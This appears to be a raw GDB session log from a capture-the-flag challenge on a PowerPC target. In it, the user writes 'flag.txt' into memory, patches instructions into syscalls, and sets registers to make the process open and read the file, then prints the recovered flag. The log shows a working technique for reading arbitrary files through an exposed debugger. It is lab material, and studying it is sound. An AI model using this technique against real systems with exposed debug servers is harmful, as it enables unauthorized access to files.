pc             0xfef7f4c           0xfef7f4c
msr            0xd932              55602
cr             0x22002442          570434626
lr             0xfef7e0c           0xfef7e0c
ctr            0xfef7e00           267353600
xer            0x0                 0
orig_r3        0x1200011           18874385
(gdb) set *(int*)0xfef7f40=1718378855
(gdb) set *(int*)0xfef7f44=779384948
(gdb) set *(int*)0xfef7f48=0
(gdb) p $pc
$1 = (void (*)()) 0xfef7f4c
(gdb) set *(int*)0xfef7f4c=1140850690
(gdb) nearpc
Undefined command: "nearpc".  Try "help".
(gdb) x/32i $pc
=> 0xfef7f4c: sc
   0xfef7f50: andis.  r9,r0,4096
   0xfef7f54: mr      r27,r3
   0xfef7f58: bne     0xfef8070
   0xfef7f5c: cmpwi   cr7,r3,0
   0xfef7f60: bne     cr7,0xfef8080
   0xfef7f64: lwz     r10,-1016(r30)
   0xfef7f68: mr      r9,r2
   0xfef7f6c: lwz     r10,0(r10)
   0xfef7f70: cmpwi   cr7,r10,0
   0xfef7f74: beq     cr7,0xfef7f84
   0xfef7f78: lwz     r8,0(r10)
   0xfef7f7c: addi    r8,r8,4
   0xfef7f80: stw     r8,0(r10)
   0xfef7f84: lwz     r10,-460(r30)
   0xfef7f88: addi    r8,r9,-29792
   0xfef7f8c: addi    r3,r9,-29904
   0xfef7f90: stw     r8,-29792(r9)
   0xfef7f94: lwz     r10,0(r10)
   0xfef7f98: cmpwi   cr7,r10,0
   0xfef7f9c: bne     cr7,0xfef81f8
   0xfef7fa0: bne     cr4,0xfef8190
   0xfef7fa4: cmpwi   cr7,r29,0
   0xfef7fa8: lwz     r9,-980(r30)
   0xfef7fac: li      r10,0
   0xfef7fb0: li      r8,1
   0xfef7fb4: stw     r8,1232(r9)
   0xfef7fb8: stw     r10,1220(r9)
   0xfef7fbc: stw     r10,1224(r9)
   0xfef7fc0: stw     r10,1228(r9)
   0xfef7fc4: stw     r10,1236(r9)
   0xfef7fc8: stw     r10,1240(r9)
(gdb) info  r
r0             0x5                 5
r1             0xbfdb19d0          3218807248
r2             0xb791adb0          3079777712
r3             0xfef7f40           267353920
r4             0x0                 0
r5             0x0                 0
r6             0x0                 0
r7             0xb7913948          3079747912
r8             0x0                 0
r9             0x0                 0
r10            0xbfdb1a40          3218807360
r11            0x3                 3
r12            0x22000442          570426434
r13            0x1001f634          268564020
r14            0xc18d00            12684544
r15            0x1                 1
r16            0xc18b50            12684112
r17            0xc18634            12682804
r18            0xc18b34            12684084
r19            0xc18c58            12684376
r20            0x0                 0
r21            0x11b6c80           18574464
r22            0x40                64
r23            0x11b7ed0           18579152
r24            0x11c5300           18633472
r25            0x1062a620          274900512
r26            0x0                 0
r27            0xb7915de0          3079757280
r28            0x0                 0
r29            0x0                 0
r30            0xffebff4           268353524
r31            0xbfdb19d0          3218807248
pc             0xfef7f4c           0xfef7f4c
msr            0xd932              55602
cr             0x22002442          570434626
lr             0xfef7e0c           0xfef7e0c
ctr            0xfef7e00           267353600
xer            0x0                 0
orig_r3        0x1200011           18874385
(gdb) x/s 0xfef7f40
0xfef7f40:  "flag.txt"
(gdb) ni
0x0fef7f50 in ?? ()
(gdb) info r
r0             0x5                 5
r1             0xbfdb19d0          3218807248
r2             0xb791adb0          3079777712
r3             0x6                 6
r4             0x0                 0
r5             0x0                 0
r6             0x0                 0
r7             0xb7913948          3079747912
r8             0x0                 0
r9             0x0                 0
r10            0xbfdb1a40          3218807360
r11            0x3                 3
r12            0x22000442          570426434
r13            0x1001f634          268564020
r14            0xc18d00            12684544
r15            0x1                 1
r16            0xc18b50            12684112
r17            0xc18634            12682804
r18            0xc18b34            12684084
r19            0xc18c58            12684376
r20            0x0                 0
r21            0x11b6c80           18574464
r22            0x40                64
r23            0x11b7ed0           18579152
r24            0x11c5300           18633472
r25            0x1062a620          274900512
r26            0x0                 0
r27            0xb7915de0          3079757280
r28            0x0                 0
r29            0x0                 0
r30            0xffebff4           268353524
r31            0xbfdb19d0          3218807248
pc             0xfef7f50           0xfef7f50
msr            0xdd32              56626
cr             0x22002442          570434626
lr             0xfef7e0c           0xfef7e0c
ctr            0xfef7e00           267353600
xer            0x0                 0
orig_r3        0xfef7f40           267353920
(gdb) set $r0=3
(gdb) set *(int*)0xfef7f50=1140850690
(gdb) set $r4=$sp
(gdb) set $r5=0x100
(gdb) info r
r0             0x3                 3
r1             0xbfdb19d0          3218807248
r2             0xb791adb0          3079777712
r3             0x6                 6
r4             0xbfdb19d0          3218807248
r5             0x100               256
r6             0x0                 0
r7             0xb7913948          3079747912
r8             0x0                 0
r9             0x0                 0
r10            0xbfdb1a40          3218807360
r11            0x3                 3
r12            0x22000442          570426434
r13            0x1001f634          268564020
r14            0xc18d00            12684544
r15            0x1                 1
r16            0xc18b50            12684112
r17            0xc18634            12682804
r18            0xc18b34            12684084
r19            0xc18c58            12684376
r20            0x0                 0
r21            0x11b6c80           18574464
r22            0x40                64
r23            0x11b7ed0           18579152
r24            0x11c5300           18633472
r25            0x1062a620          274900512
r26            0x0                 0
r27            0xb7915de0          3079757280
r28            0x0                 0
r29            0x0                 0
r30            0xffebff4           268353524
r31            0xbfdb19d0          3218807248
pc             0xfef7f50           0xfef7f50
msr            0xdd32              56626
cr             0x22002442          570434626
lr             0xfef7e0c           0xfef7e0c
ctr            0xfef7e00           267353600
xer            0x0                 0
orig_r3        0xfef7f40           267353920
(gdb) x/32i $pc
=> 0xfef7f50: sc
   0xfef7f54: mr      r27,r3
   0xfef7f58: bne     0xfef8070
   0xfef7f5c: cmpwi   cr7,r3,0
   0xfef7f60: bne     cr7,0xfef8080
   0xfef7f64: lwz     r10,-1016(r30)
   0xfef7f68: mr      r9,r2
   0xfef7f6c: lwz     r10,0(r10)
   0xfef7f70: cmpwi   cr7,r10,0
   0xfef7f74: beq     cr7,0xfef7f84
   0xfef7f78: lwz     r8,0(r10)
   0xfef7f7c: addi    r8,r8,4
   0xfef7f80: stw     r8,0(r10)
   0xfef7f84: lwz     r10,-460(r30)
   0xfef7f88: addi    r8,r9,-29792
   0xfef7f8c: addi    r3,r9,-29904
   0xfef7f90: stw     r8,-29792(r9)
   0xfef7f94: lwz     r10,0(r10)
   0xfef7f98: cmpwi   cr7,r10,0
   0xfef7f9c: bne     cr7,0xfef81f8
   0xfef7fa0: bne     cr4,0xfef8190
   0xfef7fa4: cmpwi   cr7,r29,0
   0xfef7fa8: lwz     r9,-980(r30)
   0xfef7fac: li      r10,0
   0xfef7fb0: li      r8,1
   0xfef7fb4: stw     r8,1232(r9)
   0xfef7fb8: stw     r10,1220(r9)
   0xfef7fbc: stw     r10,1224(r9)
   0xfef7fc0: stw     r10,1228(r9)
   0xfef7fc4: stw     r10,1236(r9)
   0xfef7fc8: stw     r10,1240(r9)
   0xfef7fcc: beq     cr7,0xfef800c
(gdb) ni
0x0fef7f54 in ?? ()
(gdb) info r
r0             0x3                 3
r1             0xbfdb19d0          3218807248
r2             0xb791adb0          3079777712
r3             0x1c                28
r4             0xbfdb19d0          3218807248
r5             0x100               256
r6             0x0                 0
r7             0xb7913948          3079747912
r8             0x0                 0
r9             0x0                 0
r10            0xbfdb1a40          3218807360
r11            0x3                 3
r12            0x22000442          570426434
r13            0x1001f634          268564020
r14            0xc18d00            12684544
r15            0x1                 1
r16            0xc18b50            12684112
r17            0xc18634            12682804
r18            0xc18b34            12684084
r19            0xc18c58            12684376
r20            0x0                 0
r21            0x11b6c80           18574464
r22            0x40                64
r23            0x11b7ed0           18579152
r24            0x11c5300           18633472
r25            0x1062a620          274900512
r26            0x0                 0
r27            0xb7915de0          3079757280
r28            0x0                 0
r29            0x0                 0
r30            0xffebff4           268353524
r31            0xbfdb19d0          3218807248
pc             0xfef7f54           0xfef7f54
msr            0xdd32              56626
cr             0x22002442          570434626
lr             0xfef7e0c           0xfef7e0c
ctr            0xfef7e00           267353600
xer            0x0                 0
orig_r3        0x6                 6
(gdb) x/s 0xbfdb19d0
0xbfdb19d0: "flag{Gd6s3rv3r@frOm_5cr4tch}"
(gdb)